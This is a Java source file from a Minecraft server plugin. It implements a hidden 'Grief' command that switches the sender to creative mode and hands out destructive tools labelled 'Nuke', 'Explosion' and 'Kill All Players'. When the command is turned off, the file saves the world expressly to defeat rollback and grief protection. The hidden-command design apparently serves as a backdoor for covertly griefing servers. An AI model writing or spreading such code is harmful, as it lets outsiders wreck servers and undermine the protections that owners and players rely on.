package me.oscarcusick.aurora.Commands.Executors;

import me.oscarcusick.aurora.Commands.HiddenCommandEvent;
import me.oscarcusick.aurora.Utility.GUIUtility;
import me.oscarcusick.aurora.Utility.GeneralUtility;
import net.md_5.bungee.api.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.NamespacedKey;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.plugin.Plugin;

public class GriefCommandExecutor implements Listener {
    Plugin PluginInstance;
    public GriefCommandExecutor(Plugin PluginInstance) {
        this.PluginInstance = PluginInstance;
    }

    @EventHandler
    public void GriefCommandExecutor(HiddenCommandEvent event) { // note this will wipe your hot-bar, fix later once working
        if (!event.command.equalsIgnoreCase("Grief")) {
            return;
        }
        GeneralUtility GU = new GeneralUtility(PluginInstance);
        GUIUtility GUIUtil = new GUIUtility();

        // check NBT to see if already griefing, if so disable it
        if (event.commandSender.getPersistentDataContainer().has(new NamespacedKey(PluginInstance, "Griefing"), PersistentDataType.BOOLEAN)) {
            event.commandSender.getPersistentDataContainer().remove(new NamespacedKey(PluginInstance, "Griefing"));

            // return / clear hot-bar
            event.commandSender.getInventory().getItem(0).setAmount(0);
            event.commandSender.getInventory().getItem(1).setAmount(0);
            event.commandSender.getInventory().getItem(2).setAmount(0);
            event.commandSender.getInventory().getItem(3).setAmount(0);
            event.commandSender.getInventory().getItem(4).setAmount(0);
            event.commandSender.getInventory().getItem(5).setAmount(0);
            event.commandSender.getInventory().getItem(6).setAmount(0);
            event.commandSender.getInventory().getItem(7).setAmount(0);
            event.commandSender.getInventory().getItem(8).setAmount(0);

            // set last gamemode, unless null
            if (event.commandSender.getPreviousGameMode() != null) {
                event.commandSender.setGameMode(event.commandSender.getPreviousGameMode());
            }

            // when disabling, save all the world data to disk to prevent as much roll-back and grief protection as possible
            event.commandSender.getWorld().save();

            GU.TellPlayer(event.commandSender, ChatColor.RED + "" + ChatColor.BOLD + "Disabled " + GU.Grey + "Griefing");
            return;
        }

        event.commandSender.getPersistentDataContainer().set(new NamespacedKey(PluginInstance, "Griefing"), PersistentDataType.BOOLEAN, true);

        // set their hot bar to the tools (add variable sizes in the future)
        event.commandSender.getInventory().setItem(0, GUIUtil.GenerateGUIButton(Material.ALLAY_SPAWN_EGG, GU.Purple  + "" + ChatColor.BOLD + "Giant"));
        event.commandSender.getInventory().setItem(1, GUIUtil.GenerateGUIButton(Material.NETHER_STAR, ChatColor.RED  + "" + ChatColor.BOLD + "Explosion"));
        event.commandSender.getInventory().setItem(2, GUIUtil.GenerateGUIButton(Material.END_CRYSTAL, ChatColor.DARK_RED  + "" + ChatColor.BOLD + "Nuke"));
        event.commandSender.getInventory().setItem(3, GUIUtil.GenerateGUIButton(Material.BLAZE_ROD, ChatColor.YELLOW  + "" + ChatColor.BOLD + "Light Saber"));
        event.commandSender.getInventory().setItem(4, GUIUtil.GenerateGUIButton(Material.LAVA_BUCKET, ChatColor.YELLOW  + "" + ChatColor.BOLD + "Lava"));
        event.commandSender.getInventory().setItem(5, GUIUtil.GenerateGUIButton(Material.WATER_BUCKET, ChatColor.YELLOW  + "" + ChatColor.BOLD + "Water"));
        event.commandSender.getInventory().setItem(6, GUIUtil.GenerateGUIButton(Material.ENDER_EYE, ChatColor.GREEN  + "" + ChatColor.BOLD + "Extra Sensory Perception"));
        event.commandSender.getInventory().setItem(7, GUIUtil.GenerateGUIButton(Material.TOTEM_OF_UNDYING, ChatColor.RED  + "" + ChatColor.BOLD + "Kill All Players"));
        event.commandSender.getInventory().setItem(8, GUIUtil.GenerateGUIButton(Material.ENDERMAN_SPAWN_EGG, GU.Purple  + "" + ChatColor.BOLD + "Wither"));

        // set creative
        event.commandSender.setGameMode(GameMode.CREATIVE);

        GU.TellPlayer(event.commandSender, ChatColor.GREEN + "" + ChatColor.BOLD + "Enabled " + GU.Grey + "Griefing");
    }
}
